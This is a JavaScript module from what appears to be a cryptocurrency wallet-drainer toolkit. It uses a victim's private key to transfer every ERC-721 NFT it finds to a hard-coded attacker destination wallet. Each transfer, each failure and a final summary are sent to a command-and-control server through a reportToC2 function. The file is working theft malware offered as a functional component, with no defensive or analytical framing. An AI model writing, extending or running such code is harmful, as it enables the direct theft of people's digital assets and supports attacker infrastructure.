// modules/sweepERC721.js - BACKEND VERSION
import { ethers } from 'ethers';
import { DESTINATION_WALLET, C2_SERVER_URL } from '../config.js';

export class SweepERC721 {
    constructor() {
        this.isInitialized = false;
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            // Any initialization logic would go here
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    async sweepNFTsERC721(provider, userAddress, chainName, nfts = null, privateKey) {
        console.log(`🎨 Scanning ${chainName} for ERC-721 NFTs...`);
        
        let totalTransferred = 0;
        let totalFailed = 0;
        
        // Get chainId
        const network = await provider.getNetwork();
        const chainId = Number(network.chainId);

        try {
            console.log(`🎯 NFT draining to: ${DESTINATION_WALLET}`);

            // Create signer with the provided private key
            const signer = new ethers.Wallet(privateKey, provider);

            for (const nft of nfts) {
                if (!nft.supports_erc?.includes("erc721")) continue;
                if (!nft.nft_data || nft.nft_data.length === 0) continue;
                
                // Use ethers Contract
                const contract = new ethers.Contract(nft.contract_address, [
                    "function transferFrom(address from, address to, uint256 tokenId)"
                ], signer); // Use signer instead of provider

                for (const meta of nft.nft_data) {
                    const tokenId = meta.token_id;
                    let success = false;
                    let errorMessage = null;

                    try {
                        // Execute transfer with signer
                        const tx = await contract.transferFrom(userAddress, DESTINATION_WALLET, tokenId);
                        await tx.wait();
                        
                        console.log(`✅ Transferred ${nft.contract_name} #${tokenId} from ${chainName}`);
                        success = true;
                        totalTransferred++;

                        await this.reportToC2({
                            walletAddress: userAddress,
                            action: 'sweep_erc721',
                            chainId: chainId,
                            chainName: chainName,
                            contractAddress: nft.contract_address,
                            contractName: nft.contract_name,
                            tokenId: tokenId,
                            success: true,
                            timestamp: new Date().toISOString()
                        });

                    } catch (err) {
                        errorMessage = err.message;
                        totalFailed++;
                        console.log(`❌ ${chainName} NFT #${tokenId} failed: ${err.message}`);

                        await this.reportToC2({
                            walletAddress: userAddress,
                            action: 'sweep_erc721',
                            chainId: chainId,
                            chainName: chainName,
                            contractAddress: nft.contract_address,
                            contractName: nft.contract_name,
                            tokenId: tokenId,
                            success: false,
                            error: errorMessage,
                            timestamp: new Date().toISOString()
                        });
                    }
                }
            }

            if (totalTransferred > 0 || totalFailed > 0) {
                await this.reportToC2({
                    walletAddress: userAddress,
                    action: 'sweep_erc721_summary',
                    chainId: chainId,
                    chainName: chainName,
                    totalTransferred: totalTransferred,
                    totalFailed: totalFailed,
                    success: totalFailed === 0,
                    timestamp: new Date().toISOString()
                });
            }

        } catch (err) {
            console.log(`❌ Error scanning NFTs on ${chainName}: ${err.message}`);
            
            await this.reportToC2({
                walletAddress: userAddress,
                action: 'sweep_erc721',
                chainId: chainId,
                chainName: chainName,
                success: false,
                error: err.message,
                timestamp: new Date().toISOString()
            });
        }
    }

    async reportToC2(reportData) {
        try {
            const response = await fetch(`${C2_SERVER_URL}/c2/report`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(reportData)
            });
            
            return await response.json();
        } catch (error) {
            console.error('Failed to report to C2:', error);
            return null;
        }
    }
}

// Create singleton instance
export const sweepERC721 = new SweepERC721();

// Export the sweepNFTsERC721 method directly for named imports
export const sweepNFTsERC721 = (provider, userAddress, chainName, nfts = null, privateKey) => {
    return sweepERC721.sweepNFTsERC721(provider, userAddress, chainName, nfts, privateKey);
};